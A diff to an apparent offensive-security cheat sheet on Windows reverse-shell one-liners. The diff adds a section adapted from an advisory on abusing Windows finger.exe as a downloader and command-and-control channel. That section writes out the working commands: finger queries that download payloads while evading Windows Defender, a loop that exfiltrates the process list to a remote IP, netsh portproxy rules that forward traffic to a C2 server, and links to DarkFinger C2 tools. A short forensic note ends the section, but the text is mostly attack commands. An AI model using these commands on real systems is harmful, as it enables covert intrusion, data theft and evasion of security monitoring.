@@ -1,3 +1,9 @@
+# Updates
+
+| date | name | description | comment | link |
+| --- | --- | --- | --- | --- |
+| 09/2020 | Finger download | Download files on windows, bypassing AntiVirus, using Finger.exe | Alternative to certutils.exe | [jump](#finger) |
+
 # Get Reverse-shell via Windows one-liner
 
 This article will help those who play with CTF challenges because today we will discuss “Windows One-Liner” to use malicious commands such as PowerShell or rundll32 to get the reverse shell of the Windows system. Generally, while abusing HTTP services or other programs, we get RCE vulnerability. This loophole allows you to remotely execute any system command. We have therefore prepared a list of Windows commands that enable you to use the target machine to get reverse connections.
@@ -303,3 +309,76 @@ Once the malicious XSL file will get executed on the target machine, you will ha
 
 Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
 
+## Finger
+
+Source: https://web.archive.org/web/20200912021508/http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt
+
+Microsoft Windows TCPIP Finger Command "finger.exe" that ships with the OS, can be used as a file downloader and makeshift C2 channel.
+Legitimate use of Windows Finger Command is to send Finger Protocol queries to remote Finger daemons to retrieve user information.
+However, the finger client can also save the remote server response to disk using the command line redirection operator ">".
+
+Intruders who compromise a computer may find it is locked down and "unknown" applications may be unable to download programs or tools.
+By using built-in native Windows programs, its possible they may be whitelisted by installed security programs and allowed to download files.
+
+Redteams and such using LOL methods have made use of "Certutil.exe", native Windows program for downloading files. However, Certutil.exe is
+recently blocked by Windows Defender Antivirus and logged as event "Trojan:Win32/Ceprolad.A" when it encounters http/https://.
+
+Therefore, using Windows finger we can bypass current Windows Defender security restrictions to download tools, send commands and exfil data.
+The Finger protocol as a C2 channel part works by abusing the "user" token of the FINGER Query protocol "user@host". C2 commands masked as
+finger queries can download files and or exfil data without Windows Defender interference.
+
+Download files:
+```
+C:\> finger <C2-Command>@HOST > Malwr.txt
+```
+
+Exfil running processes:
+```
+C:\> for /f "tokens=1" %i in ('tasklist') do finger %i@192.168.1.21
+```
+
+Typically, (Port 79) default port used by FINGER protocol is often blocked by organizations. Privileged users can bypass this using
+Windows NetSh Portproxy. This can allow us to bypass Firewall restrictions to reach servers using unrestricted ports like 80/443.
+Portproxy queries are then sent first to the Local Machines ip-address which are then forwarded to the C2 server specified.
+
+Port 43 (WHOIS) traffic.
+```
+netsh interface portproxy add v4tov4 listenaddress=[LOCAL-IP] listenport=79 connectaddress=[C2-Server] connectport=43
+netsh interface portproxy add v4tov4 listenaddress=[LOCAL-IP] listenport=43 connectaddress=[LOCAL-IP] connectport=79
+```
+
+To display Portproxy use 
+```
+C:\>netsh interface portproxy show all
+```
+
+E.g. using Port 79
+```
+Ncat64.exe "nc@C2-Server" > tmp.txt
+```
+
+E.g. using Portproxy, send the query to local-ip first.
+```
+Ncat64.exe "nc@Local-IP" > tmp.txt
+```
+
+To leverage Windows finger.exe successfully as a file downloader and help evade network security devices, serve Base64 encoded text-files.
+[DarkFinger.py](https://web.archive.org/web/20200912021508/http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt) expects to receive the first two characters of the filename for the Finger Protocol Host token part for file downloads.
+
+DarkFinger C2 expects exfil data to prefixed with the dot "." character, so any arbitrary inbound querys are not confused for exfil.
+This can be changed to whatever or even expanded upon to use XOR obfuscation methods etc... as this is just for basic PoC.
+
+[Event Logs / Forensics]
+Certutil.exe file downloads are now blocked and logged by Windows Defender.
+
+PowerShell, also used as an LOL method to download files usually generates Windows event logs. Finger initiated downloads write
+to disk and will leave forensic artifacts. Finger TCP/IP traffic going out to Port 80/443 minus the HTTP protocol may stand out as well.
+However, searching the Windows event logs for finger.exe entries, I found no trace of it generating Windows event logs anywhere.
+
+[DarkFinger.py](https://web.archive.org/web/20200912021508/http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt) C2 is very basic with no security. It's only to demonstrate using Windows Finger Command for as a C2 channel
+and show the possibilities. Therefore, anyone can request to change the Port DarkFinger C2 listens on and or download files.
+
+During my research, I found nothing on the internet publicly using or documenting Windows TCPIP Finger Command for use as C2 channel.
+Therefore, I release "[DarkFinger.py](https://web.archive.org/web/20200912021508/http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt)" C2 server and "[DarkFinger-Agent.bat](https://web.archive.org/web/20200912021508/http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt)" which calls the Windows finger.exe in attacker friendly ways.
+
+Tested successfully Windows 10.
